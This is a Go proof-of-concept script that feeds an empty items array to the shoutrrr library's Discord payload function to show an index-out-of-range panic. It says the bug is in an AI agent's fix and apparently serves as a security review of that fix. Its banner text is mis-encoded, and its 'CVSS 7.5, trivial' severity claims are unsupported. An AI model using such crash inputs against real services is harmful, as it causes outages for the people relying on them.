//go:build ignore
// +build ignore

// Exploit Demo - Demonstrates the vulnerability in AI agent's fix
//
// This file demonstrates how the vulnerability can be triggered.
// DO NOT use this for malicious purposes!
//
// Run with: go run exploit_demo.go

package main

import (
	"fmt"
	"os"

	"github.com/containrrr/shoutrrr/pkg/services/discord"
	"github.com/containrrr/shoutrrr/pkg/types"
)

func main() {
	fmt.Println("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
	fmt.Println("â•‘         VULNERABILITY DEMONSTRATION                        â•‘")
	fmt.Println("â•‘  CWE-129: Improper Validation of Array Index              â•‘")
	fmt.Println("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
	fmt.Println()

	fmt.Println("âš ï¸  WARNING: This demonstrates a REAL security vulnerability")
	fmt.Println("   in the AI agent's fix!")
	fmt.Println()

	// Set up panic recovery to show the crash gracefully
	defer func() {
		if r := recover(); r != nil {
			fmt.Println()
			fmt.Println("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
			fmt.Println("â•‘              â˜ ï¸  APPLICATION CRASHED!  â˜ ï¸                   â•‘")
			fmt.Println("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
			fmt.Println()
			fmt.Printf("ğŸ’¥ Panic: %v\n", r)
			fmt.Println()
			fmt.Println("This demonstrates the vulnerability:")
			fmt.Println("  â€¢ No input validation for empty arrays")
			fmt.Println("  â€¢ Direct array access without bounds check")
			fmt.Println("  â€¢ Application crashes instead of graceful error")
			fmt.Println()
			fmt.Println("In production, this would cause:")
			fmt.Println("  âŒ Service downtime")
			fmt.Println("  âŒ Lost notifications")
			fmt.Println("  âŒ Cascading failures")
			fmt.Println("  âŒ Stack trace information disclosure")
			fmt.Println()
			fmt.Println("CVSS Score: 7.5 (HIGH)")
			fmt.Println("Exploitability: TRIVIAL")
			fmt.Println()
			os.Exit(1)
		}
	}()

	fmt.Println("Step 1: Creating vulnerable conditions...")
	fmt.Println("  â€¢ Empty items array: []")
	fmt.Println("  â€¢ Empty title: \"\"")
	fmt.Println("  â€¢ Zero omitted: 0")
	fmt.Println()

	// The vulnerable inputs
	items := []types.MessageItem{} // Empty array
	title := ""                    // Empty title
	omitted := 0                   // Zero omitted
	colors := [types.MessageLevelCount]uint{
		0xFF0000, // Error: Red
		0x00FF00, // Success: Green
		0x0000FF, // Info: Blue
		0xFFFF00, // Warning: Yellow
		0xFF00FF, // Debug: Magenta
	}

	fmt.Println("Step 2: Calling CreatePayloadFromItems...")
	fmt.Println("  â†’ This will trigger the vulnerability!")
	fmt.Println()

	// This will panic!
	fmt.Println("ğŸš€ Executing vulnerable code path...")
	payload, err := discord.CreatePayloadFromItems(items, title, colors, omitted)

	// This code is never reached
	fmt.Println()
	fmt.Println("âœ… Success (This should never print!)")
	fmt.Printf("   Payload: %+v\n", payload)
	fmt.Printf("   Error: %v\n", err)
}
